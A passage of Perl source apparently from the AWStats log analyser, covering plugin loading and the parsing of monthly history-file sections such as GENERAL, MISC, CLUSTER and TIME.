					if (   !$UpdateStats
						&& scalar keys %HTMLOutput
						&& $FrameName eq 'mainleft'
						&& $pluginisfor{$pluginname} !~ /m/ )
					{
						$PluginsLoaded{'init'}{"$pluginname"} = 1;
						next;
					}

					# Do not load "update plugins" if output only
					if (   !$UpdateStats
						&& scalar keys %HTMLOutput
						&& $pluginisfor{$pluginname} !~ /o/ )
					{
						$PluginsLoaded{'init'}{"$pluginname"} = 1;
						next;
					}

					# Do not load "output plugins" if update only
					if (   $UpdateStats
						&& !scalar keys %HTMLOutput
						&& $pluginisfor{$pluginname} !~ /u/ )
					{
						$PluginsLoaded{'init'}{"$pluginname"} = 1;
						next;
					}
				}

				# Load plugin
				foreach my $dir (@PossiblePluginsDir) {
					my $searchdir = $dir;
					if (   $searchdir
						&& ( !( $searchdir =~ /\/$/ ) )
						&& ( !( $searchdir =~ /\\$/ ) ) )
					{
						$searchdir .= "/";
					}
					my $pluginpath = "${searchdir}${pluginfile}.pm";
					if ( -s "$pluginpath" ) {
						$PluginDir = "${searchdir}";    # Set plugin dir
						if ($Debug) {
							debug(
" Try to init plugin '$pluginname' ($pluginpath) with param '$pluginparam'",
								1
							);
						}
						if ( !$DirAddedInINC{"$dir"} ) {
							push @INC, "$dir";
							$DirAddedInINC{"$dir"} = 1;
						}
						my $loadret = 0;
						my $modperl = $ENV{"MOD_PERL"}
						  ? eval {
							require mod_perl;
							$mod_perl::VERSION >= 1.99 ? 2 : 1;
						  }
						  : 0;
						if ( $modperl == 2 ) {
							$loadret = require "$pluginpath";
						}
						else { $loadret = require "$pluginfile.pm"; }
						if ( !$loadret || $loadret =~ /^error/i ) {

							# Load failed, we stop here
							error(
"Plugin load for plugin '$pluginname' failed with return code: $loadret"
							);
						}
						my $ret;    # To get init return
						my $initfunction =
						  "\$ret=Init_$pluginname('$pluginparam')";		# Note that pluginname and pluginparam were sanitized when reading cong file entry 'LoadPlugin'
						my $initret = eval("$initfunction");
						if ( $initret && $initret eq 'xxx' ) {
							$initret =
'Error: The PluginHooksFunctions variable defined in plugin file does not contain list of hooked functions';
						}
						if ( !$initret || $initret =~ /^error/i ) {

							# Init function failed, we stop here
							error(
"Plugin init for plugin '$pluginname' failed with return code: "
								  . (
									$initret
									? "$initret"
									: "$@ (A module required by plugin might be missing)."
								  )
							);
						}

						# Plugin load and init successful
						foreach my $elem ( split( /\s+/, $initret ) ) {

							# Some functions can only be plugged once
							my @uniquefunc = (
								'GetCountryCodeByName',
								'GetCountryCodeByAddr',
								'ChangeTime',
								'GetTimeZoneTitle',
								'GetTime',
								'SearchFile',
								'LoadCache',
								'SaveHash',
								'ShowMenu'
							);
							my $isuniquefunc = 0;
							foreach my $function (@uniquefunc) {
								if ( "$elem" eq "$function" ) {

	# We try to load a 'unique' function, so we check and stop if already loaded
									foreach my $otherpluginname (
										keys %{ $PluginsLoaded{"$elem"} } )
									{
										error(
"Conflict between plugin '$pluginname' and '$otherpluginname'. They both implements the 'must be unique' function '$elem'.\nYou must choose between one of them. Using together is not possible."
										);
									}
									$isuniquefunc = 1;
									last;
								}
							}
							if ($isuniquefunc) {

			   # TODO Use $PluginsLoaded{"$elem"}="$pluginname"; for unique func
								$PluginsLoaded{"$elem"}{"$pluginname"} = 1;
							}
							else { $PluginsLoaded{"$elem"}{"$pluginname"} = 1; }
							if ( "$elem" =~ /SectionInitHashArray/ ) {
								$AtLeastOneSectionPlugin = 1;
							}
						}
						$PluginsLoaded{'init'}{"$pluginname"} = 1;
						if ($Debug) {
							debug(
" Plugin '$pluginname' now hooks functions '$initret'",
								1
							);
						}
						last;
					}
				}
				if ( !$PluginsLoaded{'init'}{"$pluginname"} ) {
					error(
"AWStats config file contains a directive to load plugin \"$pluginname\" (LoadPlugin=\"$plugininfo\") but AWStats can't open plugin file \"$pluginfile.pm\" for read.\nCheck if file is in \""
						  . ( $PossiblePluginsDir[0] )
						  . "\" directory and is readable." );
				}
			}
			else {
				warning(
"Warning: Tried to load plugin \"$pluginname\" twice. Fix config file."
				);
			}
		}
		else {
			error("Plugin \"$pluginfile\" is not a valid plugin name.");
		}
	}

# In output mode, geo ip plugins are not loaded, so message changes are done here (can't be done in plugin init function)
#	if (   $PluginsLoaded{'init'}{'geoip'}
#		|| $PluginsLoaded{'init'}{'geoip6'}
#		|| $PluginsLoaded{'init'}{'geoipfree'}
#		|| $PluginsLoaded{'init'}{'geoip2_country'})
#	{
#		$Message[17] = $Message[25] = $Message[148];
#	}
}

#------------------------------------------------------------------------------
# Function:		Read history file and create or update tmp history file
# Parameters:	year,month,day,hour,withupdate,withpurge,part_to_load[,lastlinenb,lastlineoffset,lastlinechecksum]
# Input:		$DirData $PROG $FileSuffix $LastLine $DatabaseBreak
# Output:		None
# Return:		Tmp history file name created/updated or '' if withupdate is 0
#------------------------------------------------------------------------------
sub Read_History_With_TmpUpdate {

	my $year  = sprintf( "%04i", shift || 0 );
	my $month = sprintf( "%02i", shift || 0 );
	my $day   = shift;
	if ( $day ne '' ) { $day = sprintf( "%02i", $day ); }
	my $hour = shift;
	if ( $hour ne '' ) { $hour = sprintf( "%02i", $hour ); }
	my $withupdate = shift || 0;
	my $withpurge  = shift || 0;
	my $part       = shift || '';

	my ( $date, $filedate ) = ( '', '' );
	if ( $DatabaseBreak eq 'month' ) {
		$date     = sprintf( "%04i%02i", $year,  $month );
		$filedate = sprintf( "%02i%04i", $month, $year );
	}
	elsif ( $DatabaseBreak eq 'year' ) {
		$date     = sprintf( "%04i%", $year );
		$filedate = sprintf( "%04i",  $year );
	}
	elsif ( $DatabaseBreak eq 'day' ) {
		$date     = sprintf( "%04i%02i%02i", $year,  $month, $day );
		$filedate = sprintf( "%02i%04i%02i", $month, $year,  $day );
	}
	elsif ( $DatabaseBreak eq 'hour' ) {
		$date     = sprintf( "%04i%02i%02i%02i", $year,  $month, $day, $hour );
		$filedate = sprintf( "%02i%04i%02i%02i", $month, $year,  $day, $hour );
	}

	my $xml   = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );
	my $xmleb = '</table><nu>';
	my $xmlrb = '<tr><td>';

	my $lastlinenb       = shift || 0;
	my $lastlineoffset   = shift || 0;
	my $lastlinechecksum = shift || 0;

	my %allsections = (
		'general'               => 1,
		'misc'                  => 2,
		'time'                  => 3,
		'visitor'               => 4,
		'day'                   => 5,
		'domain'                => 6,
		'cluster'               => 7,
		'login'                 => 8,
		'robot'                 => 9,
		'worms'                 => 10,
		'emailsender'           => 11,
		'emailreceiver'         => 12,
		'session'               => 13,
		'sider'                 => 14,
		'filetypes'             => 15,
		'downloads'				=> 16,
		'os'                    => 17,
		'browser'               => 18,
		'screensize'            => 19,
		'unknownreferer'        => 20,
		'unknownrefererbrowser' => 21,
		'origin'                => 22,
		'sereferrals'           => 23,
		'pagerefs'              => 24,
		'searchwords'           => 25,
		'keywords'              => 26,
		'errors'                => 27,
        'filesize'              => 28,
        'requesttime'           => 29,
	);

	my $order = ( scalar keys %allsections ) + 1;
	foreach ( keys %TrapInfosForHTTPErrorCodes ) {
		$allsections{"sider_$_"} = $order++;
	}
	foreach ( 1 .. @ExtraName - 1 ) { $allsections{"extra_$_"} = $order++; }
	foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
		$allsections{"plugin_$_"} = $order++;
	}
	my $withread = 0;

	# Variable used to read old format history files
	my $readvisitorforbackward = 0;

	if ($Debug) {
		debug(
"Call to Read_History_With_TmpUpdate [$year,$month,$day,$hour,withupdate=$withupdate,withpurge=$withpurge,part=$part,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]"
		);
	}
	if ($Debug) { debug("date=$date"); }

	# Define SectionsToLoad (which sections to load)
	my %SectionsToLoad = ();
	if ( $part eq 'all' ) {    # Load all needed sections
		my $order = 1;
		$SectionsToLoad{'general'} = $order++;

		# When
		$SectionsToLoad{'time'} = $order
		  ++; # Always loaded because needed to count TotalPages, TotalHits, TotalBandwidth
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowHostsStats )
			|| $HTMLOutput{'allhosts'}
			|| $HTMLOutput{'lasthosts'}
			|| $HTMLOutput{'unknownip'} )
		{
			$SectionsToLoad{'visitor'} = $order++;
		}     # Must be before day, sider and session section
		if (
			   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'}
				&& ( $ShowDaysOfWeekStats || $ShowDaysOfMonthStats ) )
			|| $HTMLOutput{'alldays'}
		  )
		{
			$SectionsToLoad{'day'} = $order++;
		}

		# Who
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowDomainsStats )
			|| $HTMLOutput{'alldomains'} )
		{
			$SectionsToLoad{'domain'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowAuthenticatedUsers )
			|| $HTMLOutput{'alllogins'}
			|| $HTMLOutput{'lastlogins'} )
		{
			$SectionsToLoad{'login'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowRobotsStats )
			|| $HTMLOutput{'allrobots'}
			|| $HTMLOutput{'lastrobots'} )
		{
			$SectionsToLoad{'robot'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowWormsStats )
			|| $HTMLOutput{'allworms'}
			|| $HTMLOutput{'lastworms'} )
		{
			$SectionsToLoad{'worms'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowEMailSenders )
			|| $HTMLOutput{'allemails'}
			|| $HTMLOutput{'lastemails'} )
		{
			$SectionsToLoad{'emailsender'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowEMailReceivers )
			|| $HTMLOutput{'allemailr'}
			|| $HTMLOutput{'lastemailr'} )
		{
			$SectionsToLoad{'emailreceiver'} = $order++;
		}

		# Navigation
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowSessionsStats )
			|| $HTMLOutput{'sessions'} )
		{
			$SectionsToLoad{'session'} = $order++;
		}
                if (   $UpdateStats
                        || $MigrateStats
                        || ($HTMLOutput{'main'} && $ShowFileSizesStats)
                        || $HTMLOutput{'filesizes'} )
                {
                        $SectionsToLoad{'filesize'} = $order++;
                }
                if (   $UpdateStats
                        || $MigrateStats
                        || ( $HTMLOutput{'main'} && $ShowRequestTimesStats )
                        || $HTMLOutput{'requesttime'} )
                {
                        $SectionsToLoad{'requesttime'} = $order++;
                }
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowPagesStats )
			|| $HTMLOutput{'urldetail'}
			|| $HTMLOutput{'urlentry'}
			|| $HTMLOutput{'urlexit'} )
		{
			$SectionsToLoad{'sider'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowFileTypesStats )
			|| $HTMLOutput{'filetypes'} )
		{
			$SectionsToLoad{'filetypes'} = $order++;
		}
		
		if ( $UpdateStats 
		    || $MigrateStats 
		    || ($HTMLOutput{'main'} && $ShowDownloadsStats )
		    || $HTMLOutput{'downloads'} )
		{
			$SectionsToLoad{'downloads'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowOSStats )
			|| $HTMLOutput{'osdetail'} )
		{
			$SectionsToLoad{'os'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowBrowsersStats )
			|| $HTMLOutput{'browserdetail'} )
		{
			$SectionsToLoad{'browser'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownos'} ) {
			$SectionsToLoad{'unknownreferer'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownbrowser'} ) {
			$SectionsToLoad{'unknownrefererbrowser'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowScreenSizeStats ) )
		{
			$SectionsToLoad{'screensize'} = $order++;
		}

		# Referers
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowOriginStats )
			|| $HTMLOutput{'origin'} )
		{
			$SectionsToLoad{'origin'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowOriginStats )
			|| $HTMLOutput{'refererse'} )
		{
			$SectionsToLoad{'sereferrals'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowOriginStats )
			|| $HTMLOutput{'refererpages'} )
		{
			$SectionsToLoad{'pagerefs'} = $order++;
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowKeyphrasesStats )
			|| $HTMLOutput{'keyphrases'}
			|| $HTMLOutput{'keywords'} )
		{
			$SectionsToLoad{'searchwords'} = $order++;
		}
		if ( !$withupdate && $HTMLOutput{'main'} && $ShowKeywordsStats ) {
			$SectionsToLoad{'keywords'} = $order++;
		}    # If we update, there is no need to load
		     # Others
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowMiscStats ) )
		{
			$SectionsToLoad{'misc'} = $order++;
		}
		if (
			   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'}
				&& ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats ) )
			|| $HTMLOutput{'errors'}
		  )
		{
			$SectionsToLoad{'errors'} = $order++;
		}
		foreach ( keys %TrapInfosForHTTPErrorCodes ) {
			if ( $UpdateStats || $MigrateStats || $HTMLOutput{"errors$_"} ) {
				$SectionsToLoad{"sider_$_"} = $order++;
			}
		}
		if (   $UpdateStats
			|| $MigrateStats
			|| ( $HTMLOutput{'main'} && $ShowClusterStats ) )
		{
			$SectionsToLoad{'cluster'} = $order++;
		}
		foreach ( 1 .. @ExtraName - 1 ) {
			if (   $UpdateStats
				|| $MigrateStats
				|| ( $HTMLOutput{'main'} && $ExtraStatTypes[$_] )
				|| $HTMLOutput{"allextra$_"} )
			{
				$SectionsToLoad{"extra_$_"} = $order++;
			}
		}
		foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
			if ( $UpdateStats || $MigrateStats || $HTMLOutput{"plugin_$_"} ) {
				$SectionsToLoad{"plugin_$_"} = $order++;
			}
		}
	}
	else {    # Load only required sections
		my $order = 1;
		foreach ( split( /\s+/, $part ) ) { $SectionsToLoad{$_} = $order++; }
	}

	# Define SectionsToSave (which sections to save)
	my %SectionsToSave = ();
	if ($withupdate) {
		if ( $SectionsToBeSaved eq 'all' ) {
			%SectionsToSave = %allsections;
		}
		else {
			my $order = 1;
			foreach ( split( /\s+/, $SectionsToBeSaved ) ) {
				$SectionsToSave{$_} = $order++;
			}
		}
	}

	if ($Debug) {
		debug(
			" List of sections marked for load : "
			  . join(
				' ',
				(
					sort { $SectionsToLoad{$a} <=> $SectionsToLoad{$b} }
					  keys %SectionsToLoad
				)
			  ),
			2
		);
		debug(
			" List of sections marked for save : "
			  . join(
				' ',
				(
					sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
					  keys %SectionsToSave
				)
			  ),
			2
		);
	}

# Define value for filetowrite and filetoread (Month before Year kept for backward compatibility)
	my $filetowrite = '';
	my $filetoread  = '';
	if ( $HistoryAlreadyFlushed{"$year$month$day$hour"}
		&& -s "$DirData/$PROG$filedate$FileSuffix.tmp.$$" )
	{

		# tmp history file was already flushed
		$filetoread  = "$DirData/$PROG$filedate$FileSuffix.tmp.$$";
		$filetowrite = "$DirData/$PROG$filedate$FileSuffix.tmp.$$.bis";
	}
	else {
		$filetoread  = "$DirData/$PROG$filedate$FileSuffix.txt";
		$filetowrite = "$DirData/$PROG$filedate$FileSuffix.tmp.$$";
	}
	if ($Debug) { debug( " History file to read is '$filetoread'", 2 ); }

# Is there an old data file to read or, if migrate, can we open the file for read
	if ( -s $filetoread || $MigrateStats ) { $withread = 1; }

	# Open files
	if ($withread) {
		open( HISTORY, $filetoread )
		  || error( "Couldn't open file \"$filetoread\" for read: $!",
			"", "", $MigrateStats );
		binmode HISTORY
		  ; # Avoid premature EOF due to history files corrupted with \cZ or bin chars
	}
	if ($withupdate) {
		open( HISTORYTMP, ">$filetowrite" )
		  || error("Couldn't open file \"$filetowrite\" for write: $!");
		binmode HISTORYTMP;
		if ($xml) {
			print HISTORYTMP
'<xml xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.awstats.org/files/awstats.xsd">'
			  . "\n\n";
		}
		Save_History( "header", $year, $month, $date );
	}

	# Loop on read file
	my $readxml = 0;
	if ($withread) {
		my $countlines = 0;
		my $versionnum = 0;
		my @field      = ();
		while (<HISTORY>) {
			chomp $_;
			s/\r//;
			$countlines++;

			# Test if it's xml
			if ( !$readxml && $_ =~ /^<xml/ ) {
				$readxml = 1;
				if ($Debug) { debug( " Data file format is 'xml'", 1 ); }
				next;
			}

			# Extract version from first line
			if ( !$versionnum && $_ =~ /^AWSTATS DATA FILE (\d+).(\d+)/i ) {
				$versionnum = ( $1 * 1000 ) + $2;
				if ($Debug) { debug( " Data file version is $versionnum", 1 ); }
				next;
			}

			# Analyze fields
			@field = split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
			if ( !$field[0] ) { next; }

			# Here version MUST be defined
			if ( $versionnum < 5000 ) {
				error(
"History file '$filetoread' is to old (version '$versionnum'). This version of AWStats is not compatible with very old history files. Remove this history file or use first a previous AWStats version to migrate it from command line with command: $PROG.$Extension -migrate=\"$filetoread\".",
					"", "", 1
				);
			}

			# BEGIN_GENERAL
			# TODO Manage GENERAL in a loop like other sections.
			if ( $field[0] eq 'BEGIN_GENERAL' ) {
				if ($Debug) { debug(" Begin of GENERAL section"); }
				next;
			}
			if ( $field[0] eq 'LastLine' || $field[0] eq "${xmlrb}LastLine" ) {
				if ( !$LastLine || $LastLine < int( $field[1] ) ) {
					$LastLine = int( $field[1] );
				}
				if ( $field[2] ) { $LastLineNumber   = int( $field[2] ); }
				if ( $field[3] ) { $LastLineOffset   = int( $field[3] ); }
				if ( $field[4] ) { $LastLineChecksum = int( $field[4] ); }
				next;
			}
			if ( $field[0] eq 'FirstTime' || $field[0] eq "${xmlrb}FirstTime" )
			{
				if ( !$FirstTime{$date}
					|| $FirstTime{$date} > int( $field[1] ) )
				{
					$FirstTime{$date} = int( $field[1] );
				}
				next;
			}
			if ( $field[0] eq 'LastTime' || $field[0] eq "${xmlrb}LastTime" ) {
				if ( !$LastTime{$date} || $LastTime{$date} < int( $field[1] ) )
				{
					$LastTime{$date} = int( $field[1] );
				}
				next;
			}
			if (   $field[0] eq 'LastUpdate'
				|| $field[0] eq "${xmlrb}LastUpdate" )
			{
				if ( !$LastUpdate ) { $LastUpdate = int( $field[1] ); }
				next;
			}
			if (   $field[0] eq 'TotalVisits'
				|| $field[0] eq "${xmlrb}TotalVisits" )
			{
				if ( !$withupdate ) {
					$MonthVisits{ $year . $month } += int( $field[1] );
				}
				next;
			}
			if (   $field[0] eq 'TotalUnique'
				|| $field[0] eq "${xmlrb}TotalUnique" )
			{
				if ( !$withupdate ) {
					$MonthUnique{ $year . $month } += int( $field[1] );
				}
				next;
			}
			if (   $field[0] eq 'MonthHostsKnown'
				|| $field[0] eq "${xmlrb}MonthHostsKnown" )
			{
				if ( !$withupdate ) {
					$MonthHostsKnown{ $year . $month } += int( $field[1] );
				}
				next;
			}
			if (   $field[0] eq 'MonthHostsUnknown'
				|| $field[0] eq "${xmlrb}MonthHostsUnknown" )
			{
				if ( !$withupdate ) {
					$MonthHostsUnknown{ $year . $month } += int( $field[1] );
				}
				next;
			}
			if (
				(
					   $field[0] eq 'END_GENERAL'
					|| $field[0] eq "${xmleb}END_GENERAL"
				)
			  )
			{
				if ($Debug) { debug(" End of GENERAL section"); }
				if ( $MigrateStats && !$BadFormatWarning{ $year . $month } ) {
					$BadFormatWarning{ $year . $month } = 1;
					warning(
"Warning: You are migrating a file that is already a recent version (migrate not required for files version $versionnum).",
						"", "", 1
					);
				}

				delete $SectionsToLoad{'general'};
				if ( $SectionsToSave{'general'} ) {
					Save_History( 'general', $year, $month, $date, $lastlinenb,
						$lastlineoffset, $lastlinechecksum );
					delete $SectionsToSave{'general'};
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

                        # BEGIN_FILESIZE
                        if ( $field[0] eq 'BEGIN_FILESIZE' ) {
                                if ($Debug) { debug(" Begin of FILESIZE section"); }
                                $field[0] = '';
                                my $count = 0;
                                my $countloaded = 0;
                                do {
                                        if ( $field[0] ) {
                                                $count++;
                                                if ( $SectionsToLoad{'filesize'} ) {
                                                        $countloaded++;
                                                        if ($field[1]) {
                                                               $_filesize{ $field[0] } += $field[1];
                                                        }
                                                }
                                        }
                                        $_ = <HISTORY>;
                                        chomp $_;
                                        s/\r//;
                                        @field =
                                          split( /\s+/,
                                                ( $readxml ? CleanFromTags($_) : $_) );
                                        $countlines++;
                                } until ( $field[0] eq 'END_FILESIZE'
                                           || $field[0] eq "${xmleb}END_FILESIZE"
                                           || ! $_ );
                                if (   $field[0] ne 'END_FILESIZE'
                                        && $field[0] ne "${xmleb}END_FILESIZE")
                                {
                                        error(
"History file \"$filetoread\" is corrupted (End of section FILESIZE not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).","","",1
                                        );
                                }
                                if ($Debug) {
                                        debug(
" End of FILESIZE section ($count entries, $countloaded loaded)"
                                        );
                                }
                                delete $SectionsToLoad{'filesize'};
                                if ( !scalar %SectionsToLoad ) {
                                        debug(" Stop reading history file. Got all we need.");
                                        last;
                                }
                                next;
                        }

                        # BEGIN_REQUESTTIME
                        if ( $field[0] eq 'BEGIN_REQUESTTIME' ) {
                                if ($Debug) { debug(" Begin of REQUESTTIME section"); }
                                $field[0] = '';
                                my $count = 0;
                                my $countloaded = 0;
                                do {
                                        if ( $field[0] ) {
                                                $count++;
                                                if ( $SectionsToLoad{'requesttime'} ) {
                                                        $countloaded++;
                                                        if ( $field[1] ) {
                                                                $_requesttime{ $field[0] } += $field[1];
                                                        }                                                }
                                        }
                                        $_ = <HISTORY>;
                                        chomp $_;
                                        s/\r//;
                                        @field =
                                          split( /\s+/,
                                                ( $readxml ? CleanFromTags($_) : $_) );
                                        $countlines++;
                                } until ( $field[0] eq 'END_REQUESTTIME'
                                           || $field[0] eq "${xmleb}END_REQUESTTIME"
                                           || !$_ );
                                if ( $field[0] ne 'END_REQUESTTIME'
                                      && $field[0] ne "${xmleb}END_REQUESTTIME")
                                {
                                        error(
"History file \"$filetoread\" is corrupted (End of section REQUESTTIME not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                                                "", "", 1
                                        );
                                }
                                if ($Debug) {
                                        debug(
" End of _REQUESTTIME section ($count entries, $countloaded loaded)"
                                        );
                                }
                                delete $SectionsToLoad{'requesttime'};
                                if ( !scalar %SectionsToLoad ) {
                                        debug(" Stop reading history file. Got all we need.");
                                        last;
                                }
                                next;
                        }

			# BEGIN_MISC
			if ( $field[0] eq 'BEGIN_MISC' ) {
				if ($Debug) { debug(" Begin of MISC section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'misc'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_misc_p{ $field[0] } += int( $field[1] );
							}
							if ( $field[2] ) {
								$_misc_h{ $field[0] } += int( $field[2] );
							}
							if ( $field[3] ) {
								$_misc_k{ $field[0] } += int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_MISC'
					  || $field[0] eq "${xmleb}END_MISC"
					  || !$_ );
				if (   $field[0] ne 'END_MISC'
					&& $field[0] ne "${xmleb}END_MISC" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section MISC not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of MISC section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'misc'};
				if ( $SectionsToSave{'misc'} ) {
					Save_History( 'misc', $year, $month, $date );
					delete $SectionsToSave{'misc'};
					if ($withpurge) {
						%_misc_p = ();
						%_misc_h = ();
						%_misc_k = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_CLUSTER
			if ( $field[0] eq 'BEGIN_CLUSTER' ) {
				if ($Debug) { debug(" Begin of CLUSTER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'cluster'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_cluster_p{ $field[0] } += int( $field[1] );
							}
							if ( $field[2] ) {
								$_cluster_h{ $field[0] } += int( $field[2] );
							}
							if ( $field[3] ) {
								$_cluster_k{ $field[0] } += int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_CLUSTER'
					  || $field[0] eq "${xmleb}END_CLUSTER"
					  || !$_ );
				if (   $field[0] ne 'END_CLUSTER'
					&& $field[0] ne "${xmleb}END_CLUSTER" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section CLUSTER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of CLUSTER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'cluster'};
				if ( $SectionsToSave{'cluster'} ) {
					Save_History( 'cluster', $year, $month, $date );
					delete $SectionsToSave{'cluster'};
					if ($withpurge) {
						%_cluster_p = ();
						%_cluster_h = ();
						%_cluster_k = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_TIME
			if ( $field[0] eq 'BEGIN_TIME' ) {
				my $monthpages          = 0;
				my $monthhits           = 0;
				my $monthbytes          = 0;
				my $monthnotviewedpages = 0;
				my $monthnotviewedhits  = 0;
				my $monthnotviewedbytes = 0;
				if ($Debug) { debug(" Begin of TIME section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {

					if ( $field[0] ne '' )
					{    # Test on ne '' because field[0] is '0' for hour 0)
						$count++;
						if ( $SectionsToLoad{'time'} ) {
							if (   $withupdate
								|| $MonthRequired eq 'all'
								|| $MonthRequired eq "$month" )
							{    # Still required
								$countloaded++;
								if ( $field[1] ) {
									$_time_p[ $field[0] ] += int( $field[1] );
								}
								if ( $field[2] ) {
									$_time_h[ $field[0] ] += int( $field[2] );
								}
								if ( $field[3] ) {
									$_time_k[ $field[0] ] += int( $field[3] );
								}
								if ( $field[4] ) {
									$_time_nv_p[ $field[0] ] +=
									  int( $field[4] );
								}
								if ( $field[5] ) {
									$_time_nv_h[ $field[0] ] +=
									  int( $field[5] );
								}
								if ( $field[6] ) {
									$_time_nv_k[ $field[0] ] +=
									  int( $field[6] );
								}
							}
							$monthpages          += int( $field[1] );
							$monthhits           += int( $field[2] );
							$monthbytes          += int( $field[3] );
							$monthnotviewedpages += int( $field[4] || 0 );
							$monthnotviewedhits  += int( $field[5] || 0 );
							$monthnotviewedbytes += int( $field[6] || 0 );
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_TIME'
					  || $field[0] eq "${xmleb}END_TIME"
					  || !$_ );
				if (   $field[0] ne 'END_TIME'
					&& $field[0] ne "${xmleb}END_TIME" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section TIME not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of TIME section ($count entries, $countloaded loaded)"
					);
				}
				$MonthPages{ $year . $month }          += $monthpages;
				$MonthHits{ $year . $month }           += $monthhits;
				$MonthBytes{ $year . $month }          += $monthbytes;
				$MonthNotViewedPages{ $year . $month } += $monthnotviewedpages;
				$MonthNotViewedHits{ $year . $month }  += $monthnotviewedhits;
				$MonthNotViewedBytes{ $year . $month } += $monthnotviewedbytes;
				delete $SectionsToLoad{'time'};

				if ( $SectionsToSave{'time'} ) {
					Save_History( 'time', $year, $month, $date );
					delete $SectionsToSave{'time'};
					if ($withpurge) {
						@_time_p    = ();
						@_time_h    = ();
						@_time_k    = ();
						@_time_nv_p = ();
						@_time_nv_h = ();
						@_time_nv_k = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_ORIGIN
			if ( $field[0] eq 'BEGIN_ORIGIN' ) {
